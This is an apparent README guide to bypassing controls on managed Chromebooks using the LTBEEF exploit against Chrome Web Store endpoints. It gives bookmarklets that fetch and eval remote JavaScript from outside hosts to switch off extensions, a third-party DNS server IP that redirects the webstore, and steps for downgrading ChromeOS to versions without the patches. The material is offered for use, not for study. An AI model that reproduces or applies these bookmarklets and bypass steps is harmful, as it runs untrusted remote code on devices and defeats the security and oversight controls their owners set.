# How to mod the chromebooks!
Making Chromebooks more vulnerable, one commit at a time.
Huge thanks to 3kh0 for alot of vulnerability's.
# LTBEEF
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore.
Please Note: This exploit only works on versions below 106, and eariler versions of 102

The original site created for this exploit can be found at ltbeef.netlify.app

# Installation (LTBEEF)
There are several vesions of this exploit you can use, here are the 2 most common versions:

# Bookmarklets (LTBEEF)
To use a GUI, bookmark one of the below scripts:

Ingot
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
Compact Cow's UI
`javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});`
Compact Cow's UI (Dark)
`javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);`
Navigate to https://chrome.google.com/webstorex and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!

# DNS servers (LTBEEF)
By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.

First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers" image
Set every box there to the following ip:
`158.101.114.159` (Hosted by The Greatest Giant#0110)
Navigate to https://chrome.google.com/webstorex and click on that bookmark. Flip the switches on the extentions you want to disable.

# Downgrading
Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.


# Requirements (DOWNGRADING)

A USB thumb drive with at least 4gb of storage, some board have small or bigger images, so have a beef usb, I recommend 16gb
A personal computer with access to downloading extentions
A brain
Setup

Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)
 2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board 3. Find and download the chrome version you want to your personal computer
# Instlation (DOWNGRADING)

Install Chromebook Recovery Utility onto your personal computer 
(found at https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en)
Open the extention, and click on the settings button in to top right hand corner, click "use local image"
Select the recovery image you downloaded from chrome100
Plug in the USB you wish to use, and follow the prompts on the screen
On your chromebook, press esc+reload+power and follow the prompts
On the checking for updates screen, press ctrl+shift+e to skip the "checking for updates" screen
Profit
